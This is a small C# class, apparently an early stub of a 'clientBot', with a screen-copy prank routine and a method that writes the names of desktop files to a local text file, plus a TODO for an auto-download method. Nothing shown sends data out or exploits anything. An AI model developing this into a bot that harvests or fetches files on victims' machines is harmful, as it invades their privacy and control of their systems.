using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices.WindowsRuntime;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace clientBot4._7
{
    
    class BotFunctions
    {
        private Form form = new Form();
        
        public BotFunctions()
        {
            //Todo AutoDownloadMethod
        }

        public void ShowPrettyPictures()
        {
            
            if(form != null)
            {
                int Width = Screen.PrimaryScreen.WorkingArea.Width;
                int Height = Screen.PrimaryScreen.WorkingArea.Height;
                form.Size = new Size(Width, Height);
                try
                {
                    var timer = new Timer() { Interval = 40 };
                    timer.Tick += (s, e) =>
                    {
                        Graphics graphics = form.CreateGraphics();
                        graphics.CopyFromScreen(0, 0, 0, 0, form.Size);
                        graphics.Dispose();

                    };
                    timer.Start();
                    Application.Run(form);

                }catch(Exception e)
                {

                }
            }
        }
        //можно супер кратко записать, но читабельность страдает
        public void GetAllFilesOnDesktop()
        {
            string DesktopFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string[] files = Directory.GetFiles(DesktopFilesPath);

            using (StreamWriter sr = new StreamWriter("d:/deskTopfiles.txt"))
            {
                int i = 0;
                foreach(var file in files)
                {
                    sr.WriteLine(file);
                }
                sr.Close();
            }
        }
        
        


    }
}
